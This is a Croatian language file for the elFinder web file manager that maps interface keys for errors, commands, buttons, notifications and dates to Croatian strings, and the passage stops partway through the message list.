/**
 * Croatian translation
 * @version 2022-03-01
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.hr = {
		translator : '',
		language   : 'Croatian',
		direction  : 'ltr',
		dateFormat : 'd.m.Y. H:i', // will show like: 01.03.2022. 18:44
		fancyDateFormat : '$1 H:i', // will show like: Danas 18:44
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220301-184452
		messages   : {
			'getShareText' : 'Udio',
			'Editor ': 'Urednik koda',
			/********************************** errors **********************************/
			'error'                : 'Greška',
			'errUnknown'           : 'Nepoznata greška.',
			'errUnknownCmd'        : 'Nepoznata naredba.',
			'errJqui'              : 'Kriva jQuery UI konfiguracija. Selectable, draggable, i droppable komponente moraju biti uključene.',
			'errNode'              : 'elFinder zahtjeva DOM element da bi bio stvoren.',
			'errURL'               : 'Krivo konfiguriran elFinder. Opcija URL nije postavljena.',
			'errAccess'            : 'Zabranjen pristup.',
			'errConnect'           : 'Nije moguće spajanje na server.',
			'errAbort'             : 'Prekinuta veza.',
			'errTimeout'           : 'Veza je istekla.',
			'errNotFound'          : 'Server nije pronađen.',
			'errResponse'          : 'Krivi odgovor servera.',
			'errConf'              : 'Krivo konfiguriran server',
			'errJSON'              : 'Nije instaliran PHP JSON modul.',
			'errNoVolumes'         : 'Disk nije dostupan.',
			'errCmdParams'         : 'Krivi parametri za naredbu "$1".',
			'errDataNotJSON'       : 'Podaci nisu tipa JSON.',
			'errDataEmpty'         : 'Nema podataka.',
			'errCmdReq'            : 'Pozadinski zahtjev zahtijeva naziv naredbe.',
			'errOpen'              : 'Ne mogu otvoriti "$1".',
			'errNotFolder'         : 'Objekt nije mapa.',
			'errNotFile'           : 'Objekt nije dokument.',
			'errRead'              : 'Ne mogu pročitati "$1".',
			'errWrite'             : 'Ne mogu pisati u "$1".',
			'errPerm'              : 'Pristup zabranjen',
			'errLocked'            : '"$1" je zaključan i ne može biti preimenovan, premješten ili obrisan.',
			'errExists'            : 'Dokument s imenom "$1" već postoji.',
			'errInvName'           : 'Krivo ime dokumenta',
			'errInvDirname'        : 'Nevažeći naziv mape.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Mapa nije pronađena',
			'errFileNotFound'      : 'Dokument nije pronađen',
			'errTrgFolderNotFound' : 'Mapa "$1" nije pronađena',
			'errPopup'             : 'Preglednik je spriječio otvaranje skočnog prozora. Da biste otvorili datoteku, omogućite je u opcijama preglednika.',
			'errMkdir'             : 'Ne mogu napraviti mapu "$1".',
			'errMkfile'            : 'Ne mogu napraviti dokument "$1".',
			'errRename'            : 'Ne mogu preimenovati "$1".',
			'errCopyFrom'          : 'Kopiranje s diska "$1" nije dozvoljeno.',
			'errCopyTo'            : 'Kopiranje na disk "$1" nije dozvoljeno.',
			'errMkOutLink'         : 'Nije moguće stvoriti vezu na izvan korijena volumena.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Greška pri prebacivanju dokumenta na server.',  // old name - errUploadCommon
			'errUploadFile'        : 'Ne mogu prebaciti "$1" na server', // old name - errUpload
			'errUploadNoFiles'     : 'Nema dokumenata za prebacivanje na server',
			'errUploadTotalSize'   : 'Dokumenti prelaze maksimalnu dopuštenu veličinu.', // old name - errMaxSize
			'errUploadFileSize'    : 'Dokument je prevelik.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Ovaj tip dokumenta nije dopušten.',
			'errUploadTransfer'    : '"$1" greška pri prebacivanju',
			'errUploadTemp'        : 'Ne mogu napraviti privremeni dokument za prijenos na server', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Objekt "$1" već postoji na ovoj lokaciji i ne može se zamijeniti objektom druge vrste.', // new
			'errReplace'           : 'Ne mogu zamijeniti "$1".',
			'errSave'              : 'Ne mogu spremiti "$1".',
			'errCopy'              : 'Ne mogu kopirati "$1".',
			'errMove'              : 'Ne mogu premjestiti "$1".',
			'errCopyInItself'      : 'Ne mogu kopirati "$1" na isto mjesto.',
			'errRm'                : 'Ne mogu ukloniti "$1".',
			'errTrash'             : 'Nije moguće u smeće.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Ne mogu ukloniti izvorni kod.',
			'errExtract'           : 'Nije moguće izdvojiti datoteke iz "$1".',
			'errArchive'           : 'Nije moguće stvoriti arhivu.',
			'errArcType'           : 'Nepodržana vrsta arhive.',
			'errNoArchive'         : 'Datoteka nije arhivska ili ima nepodržanu vrstu arhive.',
			'errCmdNoSupport'      : 'Backend ne podržava ovu naredbu.',
			'errReplByChild'       : 'Mapa "$1" ne može se zamijeniti stavkom koju sadrži.',
			'errArcSymlinks'       : 'Iz sigurnosnih razloga odbijeno raspakiranje arhive sadrži simbolične veze ili datoteke s nedopuštenim nazivima.', // edited 24.06.2012
			'errArcMaxSize'        : 'Arhivske datoteke premašuju maksimalnu dopuštenu veličinu.',
			'errResize'            : 'Nije moguće promijeniti veličinu "$1".',
			'errResizeDegree'      : 'Neispravan stupanj rotacije.',  // added 7.3.2013
			'errResizeRotate'      : 'Nije moguće rotirati sliku.',  // added 7.3.2013
			'errResizeSize'        : 'Nevažeća veličina slike.',  // added 7.3.2013
			'errResizeNoChange'    : 'Veličina slike nije promijenjena.',  // added 7.3.2013
			'errUsupportType'      : 'Nepodržana vrsta datoteke.',
			'errNotUTF8Content'    : 'Datoteka "$1" nije u UTF-8 i ne može se uređivati.',  // added 9.11.2011
			'errNetMount'          : 'Nije moguće montirati "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Nepodržani protokol.',     // added 17.04.2012
			'errNetMountFailed'    : 'Montiranje nije uspjelo.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Potreban host.', // added 18.04.2012
			'errSessionExpires'    : 'Vaša sesija je istekla zbog neaktivnosti.',
			'errCreatingTempDir'   : 'Nije moguće stvoriti privremeni direktorij: "$1"',
			'errFtpDownloadFile'   : 'Nije moguće preuzeti datoteku s FTP-a: "$1"',
			'errFtpUploadFile'     : 'Nije moguće prenijeti datoteku na FTP: "$1"',
			'errFtpMkdir'          : 'Nije moguće stvoriti udaljeni direktorij na FTP-u: "$1"',
			'errArchiveExec'       : 'Pogreška pri arhiviranju datoteka: "$1"',
			'errExtractExec'       : 'Pogreška prilikom izdvajanja datoteka: "$1"',
			'errNetUnMount'        : 'Unable to unmount', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Nije konvertibilno u UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Isprobajte Google Chrome, ako želite prenijeti mapu.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Isteklo je vrijeme tijekom pretraživanja "$1". Rezultat pretraživanja je djelomičan.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Potrebna je ponovna autorizacija.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Maksimalni broj stavki koje se mogu odabrati je $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Nije moguće vratiti iz smeća. Nije moguće identificirati odredište vraćanja.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Urednik nije pronađen za ovu vrstu datoteke.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Pogreška se dogodila na strani poslužitelja.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Nije moguće isprazniti mapu "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Postoji još $1 pogreške.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Možete stvoriti do $1 mape odjednom.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Arhiviraj',
			'cmdback'      : 'Nazad',
			'cmdcopy'      : 'Kopiraj',
			'cmdcut'       : 'Izreži',
			'cmddownload'  : 'Preuzmi',
			'cmdduplicate' : 'Dupliciraj',
			'cmdedit'      : 'Uredi dokument',
			'cmdextract'   : 'Raspakiraj arhivu',
			'cmdforward'   : 'Naprijed',
			'cmdgetfile'   : 'Odaberi dokumente',
			'cmdhelp'      : 'O programu',
			'cmdhome'      : 'Početak',
			'cmdinfo'      : 'Info',
			'cmdmkdir'     : 'Nova mapa',
			'cmdmkdirin'   : 'U novu mapu', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nova файл',
			'cmdopen'      : 'Otvori',
			'cmdpaste'     : 'Zalijepi',
			'cmdquicklook' : 'Pregled',
			'cmdreload'    : 'Ponovo učitaj',
			'cmdrename'    : 'Preimenuj',
			'cmdrm'        : 'Obriši',
			'cmdtrash'     : 'U smeće', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Obnovi', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Pronađi',
			'cmdup'        : 'Roditeljska mapa',
			'cmdupload'    : 'Prebaci dokumente na server',
			'cmdview'      : 'Pregledaj',
			'cmdresize'    : 'Promjeni veličinu i rotiraj',
			'cmdsort'      : 'Sortiraj',
			'cmdnetmount'  : 'Spoji se na mrežni disk', // added 18.04.2012
			'cmdnetunmount': 'Odspoji disk', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Na Mjesta', // added 28.12.2014
			'cmdchmod'     : 'Promijenite način rada', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Otvori mapu', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Ponovno postavite širinu stupca', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Puni zaslon', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Potez', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Ispraznite mapu', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Poništi', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'ponovo uraditi', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferences', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Odaberi sve', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Odaberi nijednu', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Obrni odabir', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Otvori u novom prozoru', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Sakrij (preference)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Zatvori',
			'btnSave'   : 'Spremi',
			'btnRm'     : 'Ukloni',
			'btnApply'  : 'Primjeni',
			'btnCancel' : 'Odustani',
			'btnNo'     : 'Ne',
			'btnYes'    : 'Da',
			'btnMount'  : 'Montirajte',  // added 18.04.2012
			'btnApprove': 'Idi na $1 i odobri', // from v2.1 added 26.04.2012
			'btnUnmount': 'Unmount', // from v2.1 added 30.04.2012
			'btnConv'   : 'Pretvoriti', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Ovdje',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Volumen',    // from v2.1 added 22.5.2015
			'btnAll'    : 'svi',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME vrsta', // from v2.1 added 22.5.2015
			'btnFileName':'Naziv datoteke',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Spremi i zatvori', // from v2.1 added 12.6.2015
			'btnBackup' : 'Sigurnosna kopija', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Preimenovati',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Preimenuj (sve)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Prethodno ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Sljedeće ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Spremi kao', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Otvori mapu',
			'ntffile'     : 'Otvori dokument',
			'ntfreload'   : 'Ponovo učitaj sadržaj mape',
			'ntfmkdir'    : 'Radim mapu',
			'ntfmkfile'   : 'Radim dokumente',
			'ntfrm'       : 'Brišem dokumente',
			'ntfcopy'     : 'Kopiram dokumente',
			'ntfmove'     : 'Mičem dokumente',
			'ntfprepare'  : 'Priprema za kopiranje dokumenata',
			'ntfrename'   : 'Preimenuj dokumente',
			'ntfupload'   : 'Pohranjujem dokumente na server',
			'ntfdownload' : 'Preuzimam dokumente',
			'ntfsave'     : 'Spremi dokumente',
			'ntfarchive'  : 'Radim arhivu',
			'ntfextract'  : 'Ekstrahiranje datoteka iz arhive',
			'ntfsearch'   : 'Tražim dokumente',
			'ntfresize'   : 'Promjena veličine slika',
			'ntfsmth'     : 'Nešto radeći',
			'ntfloadimg'  : 'Učitavam sliku',
			'ntfnetmount' : 'Mounting network volume', // added 18.04.2012
			'ntfnetunmount': 'Unmounting network volume', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Stjecanje dimenzije slike', // added 20.05.2013
			'ntfreaddir'  : 'Čitanje podataka mape', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Dobivanje URL-a linka', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Promjena načina rada datoteke', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Provjera naziva datoteke za prijenos', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Izrada datoteke za preuzimanje', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Dobivanje informacija o putu', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Obrada učitane datoteke', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Bacam u smeće', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Vršim obnavljanje iz smeća', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Provjera odredišne mape', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Poništavanje prethodne operacije', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Redoing previous undone', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Provjera sadržaja', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Otpad', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'nepoznato',
			'Today'       : 'Danas',
			'Yesterday'   : 'Jučer',
			'msJan'       : 'Sij',
			'msFeb'       : 'Vel',
			'msMar'       : 'Ožu',
			'msApr'       : 'Tra',
			'msMay'       : 'Svi',
			'msJun'       : 'Lip',
			'msJul'       : 'Srp',
			'msAug'       : 'Kol',
			'msSep'       : 'Ruj',
			'msOct'       : 'Lis',
			'msNov'       : 'Stu',
			'msDec'       : 'Pro',
			'January'     : 'Siječanj',
			'February'    : 'Veljača',
			'March'       : 'Ožujak',
			'April'       : 'Travanj',
			'May'         : 'Svibanj',
			'June'        : 'Lipanj',
			'July'        : 'Srpanj',
			'August'      : 'Kolovoz',
			'September'   : 'Rujan',
			'October'     : 'Listopad',
			'November'    : 'Studeni',
			'December'    : 'Prosinac',
			'Sunday'      : 'Nedjelja',
			'Monday'      : 'Ponedjeljak',
			'Tuesday'     : 'Utorak',
			'Wednesday'   : 'Srijeda',
			'Thursday'    : 'Četvrtak',
			'Friday'      : 'Petak',
			'Saturday'    : 'Subota',
			'Sun'         : 'Ned',
			'Mon'         : 'Pon',
			'Tue'         : 'Uto',
			'Wed'         : 'Sri',
			'Thu'         : 'Čet',
			'Fri'         : 'Pet',
			'Sat'         : 'Sub',

			/******************************** sort variants ********************************/
			'sortname'          : 'po imenu',
			'sortkind'          : 'po tipu',
			'sortsize'          : 'po veličini',
			'sortdate'          : 'po datumu',
			'sortFoldersFirst'  : 'Prvo mape',
			'sortperm'          : 'po dopuštenju', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'po načinu rada',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'od strane vlasnika',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'po grupi',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Također Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NoviDokument.txt', // added 10.11.2015
			'untitled folder'   : 'NovaMapa',   // added 10.11.2015
			'Archive'           : 'NovaArhiva',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Nova datoteka.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Datoteka',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Potvrda',
			'confirmRm'       : 'Jeste li sigurni?',
			'confirmRepl'     : 'Zamijeni stare dokumente novima?',
			'confirmRest'     : 'Zamijeniti postojeću stavku stavkom u smeću?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Nije u UTF-8<br/>Pretvoriti u UTF-8?<br/>Sadržaj postaje UTF-8 spremanjem nakon pretvorbe.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Nije bilo moguće otkriti kodiranje znakova ove datoteke. Mora se privremeno pretvoriti u UTF-8 radi uređivanja.<br/>Odaberite kodiranje znakova ove datoteke.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Promijenjen je.<br/>Gubi se posao ako ne spremite promjene.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Jeste li sigurni da želite premjestiti stavke u koš za smeće?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Jeste li sigurni da želite premjestiti stavke u "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Primjeni na sve ',
			'name'            : 'Ime',
			'size'            : 'Veličina',
			'perms'           : 'Dozvole',
			'modify'          : 'Modificiran',
			'kind'            : 'Tip',
			'read'            : 'čitanje',
			'write'           : 'pisanje',
			'noaccess'        : 'bez pristupa',
			'and'             : 'i',
			'unknown'         : 'nepoznato',
			'selectall'       : 'Odaberi sve',
			'selectfiles'     : 'Odaberi dokument(e)',
			'selectffile'     : 'Odaberi prvi dokument',
			'selectlfile'     : 'Odaberi zadnji dokument',
			'viewlist'        : 'Lista',
			'viewicons'       : 'Ikone',
			'viewSmall'       : 'Male ikone', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Srednje ikone', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Velike ikone', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Ekstra velike ikone', // from v2.1.39 added 22.5.2018
			'places'          : 'Mjesta',
			'calc'            : 'Računaj',
			'path'            : 'Put',
			'aliasfor'        : 'Drugo ime za',
			'locked'          : 'Zaključano',
			'dim'             : 'Dimenzije',
			'files'           : 'Dokumenti',
			'folders'         : 'Mape',
			'items'           : 'Stavke',
			'yes'             : 'da',
			'no'              : 'ne',
			'link'            : 'poveznica',
			'searcresult'     : 'Rezultati pretrage',
			'selected'        : 'odabrane stavke',
			'about'           : 'Info',
			'shortcuts'       : 'Prečaci',
			'help'            : 'Pomoć',
			'webfm'           : 'Web upravitelj datoteka',
			'ver'             : 'Verzija',
			'protocolver'     : 'verzija protokola',
			'homepage'        : 'Projektni dom',
			'docs'            : 'Dokumentacija',
			'github'          : 'Fork us on Github',
			'twitter'         : 'Follow us on twitter',
			'facebook'        : 'Join us on facebook',
			'team'            : 'Tim',
			'chiefdev'        : 'glavni developer',
			'developer'       : 'razvojni programer',
			'contributor'     : 'doprinositelj',
			'maintainer'      : 'održavatelj',
			'translator'      : 'prevoditelj',
			'icons'           : 'Ikone',
			'dontforget'      : 'i ne zaboravi uzeti svoj ručnik',
			'shortcutsof'     : 'Prečaci isključeni',
			'dropFiles'       : 'Ovdje ispusti dokumente',
			'or'              : 'ili',
			'selectForUpload' : 'Odaberi dokumente koje prebacuješ na server',
			'moveFiles'       : 'Premjesti dokumente',
			'copyFiles'       : 'Kopiraj dokumente',
			'restoreFiles'    : 'Vrati stavke', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Uklonite s mjesta',
			'aspectRatio'     : 'Omjer stranica',
			'scale'           : 'Skaliraj',
			'width'           : 'Širina',
			'height'          : 'Visina',
			'resize'          : 'Promjena veličine',
			'crop'            : 'Usjev',
			'rotate'          : 'Rotirati',
			'rotate-cw'       : 'Rotirajte za 90 stupnjeva CW',
			'rotate-ccw'      : 'Rotirajte za 90 stupnjeva u smjeru suprotnom od smjera desno',
			'degree'          : '°',
			'netMountDialogTitle' : 'Montirajte mrežni volumen', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Domaćin', // added 18.04.2012
			'port'                : 'Luka', // added 18.04.2012
			'user'                : 'Korisnik', // added 18.04.2012
			'pass'                : 'Zaporka', // added 18.04.2012
			'confirmUnmount'      : 'Jeste li isključili $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Ispustite ili zalijepite datoteke iz preglednika', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Ovdje ispustite ili zalijepite datoteke i URL-ove', // from v2.1 added 07.04.2014
			'encoding'        : 'Encoding', // from v2.1 added 19.12.2014
			'locale'          : 'Jezik',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Cilj: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Pretraživanje po MIME vrsti unosa', // from v2.1 added 22.5.2015
			'owner'           : 'Vlasnik', // from v2.1 added 20.6.2015
			'group'           : 'Grupa', // from v2.1 added 20.6.2015
			'other'           : 'Other', // from v2.1 added 20.6.2015
			'execute'         : 'Izvrši', // from v2.1 added 20.6.2015
			'perm'            : 'Dozvole', // from v2.1 added 20.6.2015
			'mode'            : 'Mode', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Mapa je prazna', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Mapa je prazna\\A Dovuci dokumente koje želiš dodati', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Mapa je prazna\\A Pritisni dugo za dodavanje dokumenata', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kvaliteta', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Automatska sinkronizacija',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Gore',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Nabavite URL vezu', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Odabrane stavke ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID foldera', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Dopustite izvanmrežni pristup', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Za ponovnu provjeru autentičnosti', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Učitava se...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Otvorite više datoteka', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Pokušavate otvoriti $1 datoteke. Jeste li sigurni da želite otvoriti u pregledniku?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Rezultati pretraživanja su prazni u cilju pretraživanja.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Uređuje datoteku.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Odabrali ste $1 stavke.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Imate $1 stavke u međuspremniku.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Inkrementalno pretraživanje je samo iz trenutnog prikaza.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Vratite u funkciju', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 završeno', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Kontekstni izbornik', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Okretanje stranice', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Korijeni volumena', // from v2.1.16 added 16.9.2016
			'reset'           : 'Resetiraj', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Boja pozadine', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Birač boja', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Mreža od 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Omogućeno', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Onemogućeno', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Rezultati pretraživanja su prazni u trenutnom prikazu.\\APritisnite [Enter] za proširenje cilja pretraživanja.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Rezultati pretraživanja prvog slova su prazni u trenutnom prikazu.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Oznaka teksta', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 preostalo min', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Ponovno otvori s odabranim kodiranjem', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Spremite s odabranim kodiranjem', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Odaberite mapu', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Pretraživanje prvog slova', // from v2.1.23 added 24.3.2017
			'presets'         : 'Unaprijed postavljene postavke', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Previše je predmeta pa ne može u smeće.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'TextArea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Ispraznite mapu "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Nema stavki u mapi "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'preferencija', // from v2.1.26 added 28.6.2017
			'language'        : 'Jezik', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inicijalizirajte postavke spremljene u ovom pregledniku', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Postavke alatne trake', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... preostalih $1 znakova.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... preostalih $1 redaka.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'zbroj', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Gruba veličina datoteke', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Usredotočite se na element dijaloga s prelaskom miša',  // from v2.1.30 added 2.11.2017
			'select'          : 'Odaberi', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Radnja pri odabiru datoteke', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Otvorite zadnji put korištenim uređivačom', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Obrni odabir', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Jeste li sigurni da želite preimenovati $1 odabrane stavke poput $2?<br/>Ovo se ne može poništiti!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Preimenovanje grupe', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Broj', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Dodajte prefiks', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Dodajte sufiks', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Promjena ekstenzije', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Postavke stupaca (prikaz popisa)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Sve promjene će se odmah odraziti na arhivu.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Sve promjene neće se odraziti sve dok ne isključite ovaj volumen.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Sljedeći volumen(i) montirani na ovaj volumen također su se demontirali. Jeste li sigurni da ćete ga isključiti?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Informacije o odabiru', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmi za prikaz hash datoteke', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Info stavke (Informacija o izboru)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Pritisnite ponovno za izlaz.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Alatna traka', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Radni prostor', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialog', // from v2.1.38 added 4.4.2018
			'all'             : 'svi', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Veličina ikone (prikaz ikona)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Otvorite uvećani prozor uređivača', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Budući da konverzija putem API-ja trenutno nije dostupna, molimo vas da izvršite konverziju na web stranici.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Nakon pretvorbe morate prenijeti s URL-om stavke ili preuzetu datoteku da biste spremili pretvorenu datoteku.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Pretvorite na web-mjestu od $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integracije', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Ovaj elFinder ima integrirane sljedeće vanjske usluge. Prije korištenja provjerite uvjete korištenja, politiku privatnosti itd.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Prikaži skrivene stavke', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Sakrij skrivene stavke', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Prikaži/sakrij skrivene stavke', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Vrste datoteka za omogućavanje s "Nova datoteka"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Vrsta tekstualne datoteke', // from v2.1.41 added 7.8.2018
			'add'             : 'Dodajte', // from v2.1.41 added 7.8.2018
			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'Zadano', // from v2.1.43 added 19.10.2018
